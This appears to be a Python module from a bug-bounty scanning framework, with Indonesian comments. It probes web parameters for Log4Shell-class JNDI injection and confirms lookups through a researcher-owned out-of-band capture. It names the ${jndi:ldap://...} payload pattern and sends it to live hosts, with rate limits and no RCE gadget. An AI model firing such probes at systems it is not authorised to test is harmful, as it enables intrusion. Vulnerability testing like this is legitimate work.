"""jndi_probe — Log4Shell class JNDI lookup via OOB pingback (CWE-917,
critical).

Teknik: nilai ${jndi:ldap://capture/...} dikirim pada parameter query yang
dicurigai masuk log (reuse infra OOB ssrf_oob: webhook.site milik peneliti).
Konfirmasi HANYA lewat capture out-of-band — banyak server membalas 200
apa pun yang terjadi (pelajaran: HTTP 200 bisa berisi error text; body
bukan bukti lookup).

FP-guard:
  - tanpa oob_url + oob_check_url -> hanya LEAD, tidak pernah finding;
  - temuan WAJIB dari capture OOB, bukan status/error respons;
  - param dibatasi 4, 2 payload varian per param, 1 request per kirim;
  - obfuscated varian hanya menguji parser (bukan evasion akses tanpa izin).

Cease-on-data: berhenti di capture hit pertama. Tidak ada penyediaan gadget
LDAP nyata — pingback membuktikan lookup, bukan RCE penuh; severity final
tetap mengikuti bukti + rules program.
"""

from __future__ import annotations

from urllib.parse import quote as _q, urljoin, urlsplit

from . import http_engine
from .base import Tool, ToolContext, ToolResult
from ..findings import Finding
from ..payloads import JNDI_PINGBACK

_LOGGY_PARAMS = ("search", "q", "query", "filter", "name", "id", "sort",
                 "order", "user", "agent", "ref", "message", "email")


class JndiProbeTool(Tool):
    name = "jndi_probe"
    description = ("Log4Shell-class JNDI lookup via OOB capture (webhook.site "
                   "milik peneliti). Tanpa capture = LEAD.")
    risk_tags = {"active", "external"}
    source_skill = "bounty-high-02"

    def run(self, args: dict, ctx: ToolContext) -> ToolResult:
        base = str(args["url"]).rstrip("/")
        host = urlsplit(base).hostname or ""
        path = str(args.get("path") or "/")
        oob_url = str(args.get("oob_url") or "").strip()
        oob_check = str(args.get("oob_check_url") or "").strip()
        if not host:
            return ToolResult(tool=self.name, ok=True, data={"skipped": "no-host"})
        params = [p for p in (args.get("params") or _LOGGY_PARAMS)][:4]
        oob_host = (urlsplit(oob_url).hostname or "") if oob_url else ""
        data: dict = {"host": host, "path": path, "params": params,
                      "oob": bool(oob_url and oob_check), "probes": []}

        fired: list[tuple[str, str]] = []
        for p in params:
            for pl in JNDI_PINGBACK[:2 if not args.get("include_obfuscated") else 3]:
                if ctx.world.request_count >= ctx.max_requests:
                    break
                probe_target = pl.payload.replace("{host}", oob_host) \
                    if oob_host else "jndi-host-unconfirmed.invalid"
                url = urljoin(base + "/", path.lstrip("/")) + \
                    ("&" if "?" in path else "?") + \
                    f"{p}={_q(probe_target, safe='')}"
                try:
                    ctx.throttle()
                    st, _h, body, _ms = http_engine.http_get(
                        url, timeout=ctx.timeout_s)
                except Exception as e:
                    data["probes"].append({"param": p, "payload": pl.name,
                                           "error": type(e).__name__})
                    continue
                ctx.world.request_count += 1
                fired.append((p, pl.name))
                data["probes"].append({"param": p, "payload": pl.name,
                                       "status": st})
        data["fired"] = [f"{p}:{n}" for p, n in fired]

        if not (oob_url and oob_check):
            data["lead"] = ("UNCONFIRMED — payload JNDI terkirim ke " +
                            ", ".join(f"{p}:{n}" for p, n in fired) +
                            "; sediakan oob_url + "
                            "oob_check_url (capture milik peneliti) untuk "
                            "konfirmasi out-of-band")
            return ToolResult(tool=self.name, ok=True, data=data)

        try:
            ctx.throttle()
            st, _h, body, _ms = http_engine.http_get(oob_check,
                                                     timeout=ctx.timeout_s)
            ctx.world.request_count += 1
            import json
            hits = json.loads(body or "{}")
        except Exception as e:
            data["oob_check_error"] = type(e).__name__
            return ToolResult(tool=self.name, ok=True, data=data)
        count = int(hits.get("count") or len(hits.get("data") or []) or 0)
        data["oob_capture_count"] = count
        data["oob_detail"] = [
            {"ip": h.get("ip"), "ua": (h.get("user_agent") or "")[:80]}
            for h in (hits.get("data") or [])[:3]
        ]
        if count <= 0:
            return ToolResult(tool=self.name, ok=True, data=data)

        p_hit, pl_hit = fired[0] if fired else ("?", "jndi-ldap")
        findings = [Finding(
            tool=self.name,
            title=f"JNDI lookup (Log4Shell class) confirmed out-of-band on "
                  f"{host} via '{p_hit}'",
            severity="critical", cwe="CWE-917",
            description=(
                f"Nilai ${{jndi:...}} pada parameter '{p_hit}' ({pl_hit}) "
                f"memicu lookup keluar dari server produksi — terbukti lewat "
                f"capture OOB ({count} hit dari IP server). Kerentanan kelas "
                f"CVE-2021-44228: parser log/template melakukan JNDI lookup "
                f"atas input. Pingback membuktikan LOOKUP, bukan gadget RCE "
                f"penuh — severity final tetap ditentukan bukti + rules "
                f"program. cease-on-data: tidak ada payload gadget lanjutan."),
            recommendation=(
                "Upgrade log4j/logback ke versi aman; larang lookup JNDI dari "
                "input; sanitasi nilai yang masuk log; jangan interpolasi "
                "parameter mentah ke log structured."),
            target_url=base, param=p_hit,
            request=f"GET {path}?{p_hit}=<jndi-pingback-payload>",
            response=f"OOB capture: {count} hit" +
                     (f"; detail: {data['oob_detail']}" if data["oob_detail"] else ""),
            confidence=1.0, source_skill=self.source_skill,
            status="confirmed", evidence_kind="probe-pair")]
        return ToolResult(tool=self.name, ok=True, data=data, findings=findings)
